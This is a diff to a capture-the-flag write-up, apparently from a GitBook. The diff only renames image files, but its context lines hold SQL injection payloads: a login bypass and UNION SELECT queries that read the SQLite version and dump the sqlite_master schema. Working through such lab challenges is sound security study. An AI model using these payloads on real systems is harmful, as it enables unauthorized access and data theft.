@@ -10,7 +10,7 @@ Can you find the flag on this website.
 
 Additional details will be available after launching your challenge instance.
 
-<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```sql
 Username: eiei
@@ -23,13 +23,13 @@ SELECT id FROM users WHERE password = '1' IS '1'--' AND username = 'eiei'
 
 ## Welcome!
 
-<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```sql
 TEST' UNION SELECT 7, sqlite_version(), 3--
 ```
 
-<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```sql
 TEST' UNION SELECT name, sql, sqlite_version() from sqlite_master;--
